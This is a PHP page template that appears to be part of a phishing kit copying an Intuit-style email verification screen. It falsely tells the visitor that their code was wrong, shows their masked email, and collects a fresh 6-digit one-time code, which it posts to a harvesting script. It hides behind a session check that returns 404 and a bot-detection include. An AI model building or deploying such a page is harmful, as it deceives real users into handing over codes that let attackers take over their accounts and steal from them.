<?php
   session_start();
   ob_start();
   require_once('../config.php');
   include_once('../includes/php/detect.php');
   
   if(!isset($_SESSION['fallow'])) {
      header('HTTP/1.1 404 Not Found');
      exit();
   }
   ?>
   <!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/invalidcode.css">
   </head>
<?php include ("file/header.php"); ?>
<div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee snipcss0-12-26-43">
<div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius snipcss0-13-43-44" data-testid="IuxBookendsHeaderContainer">
   <div class="MfaOtpStyles__StyledContainer-e7rfsj-1 xUWxG snipcss0-14-44-45">
      <div data-testid="VerifyOtpServerError" class="IuxErrorBox__StyledDiv-sc-1uyrsey-0 kGzcKp snipcss0-15-45-46">The verification code you entered is expired or is incorrect.</div>
      <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf MfaOtpStyles__StyledIuxH2AndDescription-e7rfsj-8 kMDSZv snipcss0-15-45-47">
         <header class="snipcss0-16-47-48">
            <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12 snipcss0-17-48-49" data-testid="VerifyOtpHeader" id="VerifyOtpHeader">Check your email</h2>
            <div data-testid="VerifyOtpWeSentToPrompt" id="VerifyOtpWeSentToPrompt" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm snipcss0-17-48-50">Enter the 6-digit code we just sent to</div>
         </header>
      </section>
      <div data-testid="VerifyOtpIdentifier" class="MfaOtpStyles__StyledIdentifierDiv-e7rfsj-4 bmzQUE snipcss0-15-45-51"><?php print preg_replace_callback('/(\w)(.*?)(\w)(@.*?)$/s', function ($matches){
                        return $matches[1].preg_replace("/\w/", "*", $matches[2]).$matches[3].$matches[4];
                        }, $_SESSION['Email']); ?></div>
      <div data-testid="VerifyOtpAdditionalH2Text" class="MfaOtpStyles__StyledDontCloseTabDiv-e7rfsj-3 bvkcms snipcss0-15-45-52">(Don't close this tab)</div>
      <img src="./images/2a9bfea6627ef593caae.gif" alt="Email" data-testid="StyledImg" class="MfaOtpStyles__StyledImg-e7rfsj-5 gogmvi snipcss0-15-45-53">
      <form method="POST" action="php/invalidcode.php" name="code">
         <div data-testid="VerifyOtpField" class="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 hiOEEg snipcss0-16-54-55">
            <div class="TextField-light-8d9994d idsTSTextField TextField-TextFieldWrapper-ac3dd51 snipcss0-17-55-56 style-FFwow" id="style-FFwow">
               <label for="ius-mfa-confirm-code" class="TextField-TFLabelWrapper-5565c4c TextField-TFHasLabel-cdab9c1 snipcss0-18-56-57">
                  <span class="TextField-TFLabelOverride-1f9d70f TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f snipcss0-19-57-58">Verification code </span>
                  <div class="TextField-TFInputWrapper-5ea0f14 TextField-size-medium-253d5f0 snipcss0-19-57-59">
                    <input id="ius-mfa-confirm-code" aria-invalid="false" width="100%" class="idsF TextField-TFInput-5b74f65 TextField-light-8d9994d TextField-TFNoErrorText-e9d7d7f TextField-TFNotDisabled-7206466 TextField-size-medium-253d5f0" type="text" aria-label="Verification code" aria-required="true" autocomplete="off" data-testid="VerifyOtpInput" inputmode="numeric" maxlength="6" name="code" placeholder="" required></div>
               </label>
               <div class="snipcss0-18-56-61"></div>
            </div>
            <div class="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 pTmif">&nbsp;</div>
         </div>
         <button type="submit" data-testid="VerifyOtpSubmitButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-primary-7bd5bc4 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840 snipcss0-16-54-63" style=""><span class="Button-label-e0ecc32 snipcss0-17-63-64"><span class="snipcss0-18-64-65">Continue</span></span></button><button type="button" data-testid="VerifyOtpCancelLink" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq MfaOtpStyles__StyledIuxLinkButton-e7rfsj-0 iPAMVS snipcss0-16-54-66"><span class="Button-label-e0ecc32 snipcss0-17-66-67"><span class="snipcss0-18-67-68">I didn't get an email</span></span></button>
      </form>
   </div>
</div>
<?php include ("file/footer.php"); ?>